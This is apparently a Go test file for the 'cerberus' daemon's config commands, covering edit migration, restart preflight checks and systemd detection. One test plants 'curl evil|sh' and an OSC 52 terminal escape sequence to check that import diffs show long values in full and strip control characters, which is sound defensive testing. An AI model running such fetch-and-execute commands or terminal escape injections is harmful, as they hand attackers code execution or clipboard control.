//go:build unix

package main

import (
	"bytes"
	"net"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"carino.systems/cerberus/internal/config"
)

// An untouched `config edit` of a file written before init_done existed
// changes nothing (Load's migration applies to the edited bytes too).
func TestEditedChangesKeepsInitDoneMigration(t *testing.T) {
	raw := []byte(`{"server":{"listen":"127.0.0.1:7381","token":"abc"}}`)
	p := filepath.Join(t.TempDir(), "config.json")
	if err := os.WriteFile(p, raw, 0o600); err != nil {
		t.Fatal(err)
	}
	cur, err := config.Load(p)
	if err != nil {
		t.Fatal(err)
	}
	if !cur.Server.InitDone {
		t.Fatal("migration did not set init_done")
	}
	set, _, err := editedChanges(cur, raw)
	if err != nil || len(set) != 0 {
		t.Fatalf("untouched edit = %v, %v; want no change", set, err)
	}
	set, _, err = editedChanges(cur, []byte(`{"server":{"listen":"127.0.0.1:7381","token":"abc"},"guard":{"max_sessions":3}}`))
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := set["server.init_done"]; ok {
		t.Fatalf("unrelated edit resets init_done: %v", set)
	}
	// Saying so in the file still counts.
	set, _, _ = editedChanges(cur, []byte(`{"server":{"listen":"127.0.0.1:7381","token":"abc","init_done":false}}`))
	if v, ok := set["server.init_done"]; !ok || v != false {
		t.Fatalf("explicit init_done false = %v", set)
	}
}

// The import approval shows every value in full: a command past any
// cut-off would otherwise be approved unseen.
func TestPrintDiffShowsLongValuesInFull(t *testing.T) {
	long := strings.Repeat("a", 150) + " curl evil|sh"
	var b bytes.Buffer
	printDiff(&b, []config.PathChange{{Path: "agents",
		Old: []config.AgentProfile{{Name: "x", Command: []string{strings.Repeat("a", 150)}}},
		New: []config.AgentProfile{{Name: "x", Command: []string{long}}}}})
	if !strings.Contains(b.String(), "curl evil|sh") || strings.Contains(b.String(), "...") {
		t.Fatalf("diff hides the change:\n%s", b.String())
	}
	b.Reset()
	printDiff(&b, []config.PathChange{{Path: "x", Old: nil, New: "\x1b]52;c;evil\x07"}})
	if strings.ContainsAny(b.String(), "\x1b\x07") {
		t.Fatalf("control characters reach the terminal: %q", b.String())
	}
}

// restartPreflight refuses a saved config the daemon would not start with.
func TestRestartPreflight(t *testing.T) {
	dir := t.TempDir()
	write := func(listen string, allowPublic bool) string {
		c := config.Defaults()
		c.Server.Listen, c.Server.Token, c.Server.AllowPublic = listen, "tok", allowPublic
		p := filepath.Join(dir, "config.json")
		c.SetPath(p)
		if err := c.Save(); err != nil {
			t.Fatal(err)
		}
		return p
	}
	busy, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer busy.Close()
	cur := busy.Addr().String()
	if err := restartPreflight(write(cur, false), cur); err != nil {
		t.Fatalf("same address (bound by us): %v", err)
	}
	if err := restartPreflight(write("8.8.8.8:7340", false), cur); err == nil || !strings.Contains(err.Error(), "public") {
		t.Fatalf("public address: %v", err)
	}
	other, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	defer other.Close()
	if err := restartPreflight(write(other.Addr().String(), false), cur); err == nil {
		t.Fatal("an address in use passed")
	}
	free := freeAddr(t)
	if err := restartPreflight(write(free, false), cur); err != nil {
		t.Fatalf("free address: %v", err)
	}
	p := filepath.Join(dir, "config.json")
	if err := os.WriteFile(p, []byte("{"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := restartPreflight(p, cur); err == nil {
		t.Fatal("invalid JSON passed")
	}
}

// Only the unit's marker plus systemd's INVOCATION_ID mean systemd will
// start the daemon again; INVOCATION_ID alone is inherited from terminals.
func TestSupervisedBy(t *testing.T) {
	for _, c := range []struct {
		marker, inv string
		want        bool
	}{{"systemd", "abc", true}, {"", "abc", false}, {"systemd", "", false}, {"other", "abc", false}} {
		if got := supervisedBy(c.marker, c.inv); got != c.want {
			t.Errorf("supervisedBy(%q, %q) = %v", c.marker, c.inv, got)
		}
	}
}
